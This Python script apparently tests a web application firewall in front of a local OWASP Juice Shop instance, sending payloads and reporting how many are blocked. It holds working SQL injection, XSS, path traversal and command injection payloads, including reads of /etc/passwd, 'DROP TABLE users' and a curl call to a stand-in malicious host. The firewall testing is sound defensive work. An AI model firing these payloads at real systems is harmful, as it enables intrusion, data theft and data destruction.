#!/usr/bin/env python3
"""
OWASP Juice Shop WAF Testing Script
Tests WAF effectiveness against common exploit payloads
"""

import requests
import json
import time
from datetime import datetime
from typing import Dict, List, Tuple
import sys

# Configuration
WAF_URL = "http://localhost:8080"  # Through WAF
DIRECT_URL = "http://localhost:3000"  # Direct to Juice Shop
OUTPUT_DIR = "./test_results"

# Colors for terminal output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'

class WAFTester:
    def __init__(self):
        self.results = {
            "total_tests": 0,
            "blocked": 0,
            "bypassed": 0,
            "failed_exploits": 0,
            "categories": {}
        }
        self.detailed_results = []
        
    def test_payload(self, category: str, name: str, method: str, endpoint: str, 
                     payload: Dict = None, headers: Dict = None) -> Tuple[str, str]:
        """
        Test a single payload
        Returns: (status, reason)
        - status: BLOCKED, BYPASSED, FAILED
        - reason: description
        """
        url = f"{WAF_URL}{endpoint}"
        
        try:
            if method.upper() == "GET":
                response = requests.get(url, params=payload, headers=headers, timeout=5)
            elif method.upper() == "POST":
                response = requests.post(url, json=payload, headers=headers, timeout=5)
            else:
                return ("FAILED", "Unsupported method")
            
            # Check if WAF blocked
            if response.status_code in [403, 429]:
                return ("BLOCKED", f"WAF returned {response.status_code}")
            
            if "blocked" in response.text.lower() or "forbidden" in response.text.lower():
                return ("BLOCKED", "WAF block page detected")
            
            # Check if exploit succeeded
            if response.status_code == 200:
                if category == "sqli":
                    if "token" in response.text.lower() or '"authentication"' in response.text:
                        return ("BYPASSED", "SQLi successful - authentication bypassed")
                elif category == "xss":
                    if "<script" in response.text or "alert(" in response.text:
                        return ("BYPASSED", "XSS payload reflected in response")
                elif category == "path-traversal":
                    if "root:" in response.text or "/etc/passwd" in response.text:
                        return ("BYPASSED", "Sensitive file accessed")
                
                return ("FAILED", "Request passed WAF but exploit failed")
            
            return ("FAILED", f"Unexpected status: {response.status_code}")
            
        except requests.exceptions.Timeout:
            return ("FAILED", "Request timeout")
        except Exception as e:
            return ("FAILED", f"Error: {str(e)}")
    
    def run_sqli_tests(self):
        """SQL Injection tests"""
        print(f"\n{Colors.BLUE}=== Testing SQL Injection ==={Colors.END}")
        
        tests = [
            ("Login Bypass - Classic", "POST", "/rest/user/login", 
             {"email": "admin'--", "password": "anything"}),
            ("Login Bypass - OR 1=1", "POST", "/rest/user/login",
             {"email": "' OR 1=1--", "password": ""}),
            ("Login Bypass - UNION", "POST", "/rest/user/login",
             {"email": "' UNION SELECT * FROM users--", "password": "test"}),
            ("Search UNION", "GET", "/rest/products/search",
             {"q": "' UNION SELECT null, version(), null--"}),
            ("Search Sleep", "GET", "/rest/products/search",
             {"q": "' AND SLEEP(5)--"}),
            ("Boolean-based", "GET", "/rest/products/search",
             {"q": "' AND 1=1--"}),
            ("Error-based", "GET", "/rest/products/search",
             {"q": "' AND extractvalue(1,concat(0x7e,version()))--"}),
            ("Stacked queries", "GET", "/rest/products/search",
             {"q": "'; DROP TABLE users--"}),
            ("Time-based blind", "GET", "/rest/products/search",
             {"q": "' OR BENCHMARK(1000000,MD5(1))--"}),
            ("PostgreSQL sleep", "GET", "/rest/products/search",
             {"q": "'; SELECT pg_sleep(5)--"}),
        ]
        
        for name, method, endpoint, payload in tests:
            status, reason = self.test_payload("sqli", name, method, endpoint, payload)
            self._record_result("SQL Injection", name, status, reason, payload)
            time.sleep(0.1)  # Rate limiting
    
    def run_xss_tests(self):
        """Cross-Site Scripting tests"""
        print(f"\n{Colors.BLUE}=== Testing XSS ==={Colors.END}")
        
        tests = [
            ("Basic Script Tag", "GET", "/rest/products/search",
             {"q": "<script>alert('XSS')</script>"}),
            ("IMG onerror", "GET", "/rest/products/search",
             {"q": "<img src=x onerror=alert('XSS')>"}),
            ("SVG onload", "GET", "/rest/products/search",
             {"q": "<svg onload=alert('XSS')>"}),
            ("Iframe javascript", "GET", "/rest/products/search",
             {"q": "<iframe src=\"javascript:alert('XSS')\">"}),
            ("Event handler", "GET", "/rest/products/search",
             {"q": "<body onload=alert('XSS')>"}),
            ("Encoded script", "GET", "/rest/products/search",
             {"q": "%3Cscript%3Ealert('XSS')%3C/script%3E"}),
            ("DOM XSS", "GET", "/rest/products/search",
             {"q": "javascript:alert(document.cookie)"}),
            ("HTML Entity", "GET", "/rest/products/search",
             {"q": "&lt;script&gt;alert('XSS')&lt;/script&gt;"}),
        ]
        
        for name, method, endpoint, payload in tests:
            status, reason = self.test_payload("xss", name, method, endpoint, payload)
            self._record_result("XSS", name, status, reason, payload)
            time.sleep(0.1)
    
    def run_path_traversal_tests(self):
        """Path Traversal tests"""
        print(f"\n{Colors.BLUE}=== Testing Path Traversal ==={Colors.END}")
        
        tests = [
            ("Basic traversal", "GET", "/ftp/../../../etc/passwd", {}),
            ("URL encoded", "GET", "/ftp/..%2f..%2f..%2fetc%2fpasswd", {}),
            ("Double encoded", "GET", "/ftp/..%252f..%252fetc%252fpasswd", {}),
            ("Windows path", "GET", "/ftp/..\\..\\..\\windows\\win.ini", {}),
            ("Null byte", "GET", "/ftp/../../../etc/passwd%00.txt", {}),
        ]
        
        for name, method, endpoint, payload in tests:
            status, reason = self.test_payload("path-traversal", name, method, endpoint, payload)
            self._record_result("Path Traversal", name, status, reason, payload)
            time.sleep(0.1)
    
    def run_command_injection_tests(self):
        """Command Injection tests"""
        print(f"\n{Colors.BLUE}=== Testing Command Injection ==={Colors.END}")
        
        tests = [
            ("Semicolon ls", "GET", "/rest/products/search",
             {"q": "; ls -la"}),
            ("Pipe whoami", "GET", "/rest/products/search",
             {"q": "| whoami"}),
            ("Backtick cat", "GET", "/rest/products/search",
             {"q": "`cat /etc/passwd`"}),
            ("Dollar subshell", "GET", "/rest/products/search",
             {"q": "$(cat /etc/passwd)"}),
            ("Ampersand background", "GET", "/rest/products/search",
             {"q": "& curl malicious.com &"}),
        ]
        
        for name, method, endpoint, payload in tests:
            status, reason = self.test_payload("rce", name, method, endpoint, payload)
            self._record_result("Command Injection", name, status, reason, payload)
            time.sleep(0.1)
    
    def _record_result(self, category: str, name: str, status: str, reason: str, payload: Dict):
        """Record test result"""
        self.results["total_tests"] += 1
        
        if status == "BLOCKED":
            self.results["blocked"] += 1
            symbol = f"{Colors.GREEN}✓ BLOCKED{Colors.END}"
        elif status == "BYPASSED":
            self.results["bypassed"] += 1
            symbol = f"{Colors.RED}✗ BYPASSED{Colors.END}"
        else:
            self.results["failed_exploits"] += 1
            symbol = f"{Colors.YELLOW}○ FAILED{Colors.END}"
        
        # Update category stats
        if category not in self.results["categories"]:
            self.results["categories"][category] = {"blocked": 0, "bypassed": 0, "failed": 0}
        
        if status == "BLOCKED":
            self.results["categories"][category]["blocked"] += 1
        elif status == "BYPASSED":
            self.results["categories"][category]["bypassed"] += 1
        else:
            self.results["categories"][category]["failed"] += 1
        
        # Print result
        print(f"  {symbol} {name}: {reason}")
        
        # Store detailed result
        self.detailed_results.append({
            "category": category,
            "test_name": name,
            "status": status,
            "reason": reason,
            "payload": payload,
            "timestamp": datetime.now().isoformat()
        })
    
    def generate_report(self):
        """Generate and save report"""
        print(f"\n{Colors.BLUE}{'='*60}{Colors.END}")
        print(f"{Colors.BLUE}=== WAF Test Results ==={Colors.END}")
        print(f"{Colors.BLUE}{'='*60}{Colors.END}\n")
        
        total = self.results["total_tests"]
        blocked = self.results["blocked"]
        bypassed = self.results["bypassed"]
        failed = self.results["failed_exploits"]
        
        print(f"Total Tests:       {total}")
        print(f"{Colors.GREEN}Blocked:           {blocked} ({blocked/total*100:.1f}%){Colors.END}")
        print(f"{Colors.RED}Bypassed:          {bypassed} ({bypassed/total*100:.1f}%){Colors.END}")
        print(f"{Colors.YELLOW}Failed Exploits:   {failed} ({failed/total*100:.1f}%){Colors.END}")
        
        print(f"\n{Colors.BLUE}=== Per-Category Results ==={Colors.END}\n")
        for category, stats in self.results["categories"].items():
            cat_total = stats["blocked"] + stats["bypassed"] + stats["failed"]
            detection_rate = (stats["blocked"] / cat_total * 100) if cat_total > 0 else 0
            
            print(f"{category}:")
            print(f"  Blocked:  {stats['blocked']}/{cat_total} ({detection_rate:.1f}%)")
            print(f"  Bypassed: {stats['bypassed']}/{cat_total}")
            print(f"  Failed:   {stats['failed']}/{cat_total}\n")
        
        # Save JSON report
        import os
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        
        report_file = f"{OUTPUT_DIR}/waf_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump({
                "summary": self.results,
                "detailed_results": self.detailed_results
            }, f, indent=2)
        
        print(f"{Colors.GREEN}Report saved to: {report_file}{Colors.END}\n")
        
        # Generate recommendations
        self._generate_recommendations()
    
    def _generate_recommendations(self):
        """Generate recommendations based on test results"""
        print(f"{Colors.BLUE}=== Recommendations ==={Colors.END}\n")
        
        for category, stats in self.results["categories"].items():
            cat_total = stats["blocked"] + stats["bypassed"] + stats["failed"]
            detection_rate = (stats["blocked"] / cat_total * 100) if cat_total > 0 else 0
            
            if detection_rate < 80:
                print(f"{Colors.YELLOW}⚠ {category} detection rate is low ({detection_rate:.1f}%){Colors.END}")
                print(f"  → Review and strengthen {category} rules\n")
            elif detection_rate >= 90:
                print(f"{Colors.GREEN}✓ {category} protection is good ({detection_rate:.1f}%){Colors.END}\n")

def main():
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.BLUE}OWASP Juice Shop WAF Testing Suite{Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    
    # Check connectivity
    try:
        r = requests.get(f"{WAF_URL}/rest/admin/application-version", timeout=5)
        print(f"{Colors.GREEN}✓ WAF is reachable{Colors.END}")
    except:
        print(f"{Colors.RED}✗ Cannot reach WAF at {WAF_URL}{Colors.END}")
        sys.exit(1)
    
    tester = WAFTester()
    
    # Run test suites
    tester.run_sqli_tests()
    tester.run_xss_tests()
    tester.run_path_traversal_tests()
    tester.run_command_injection_tests()
    
    # Generate report
    tester.generate_report()

if __name__ == "__main__":
    main()
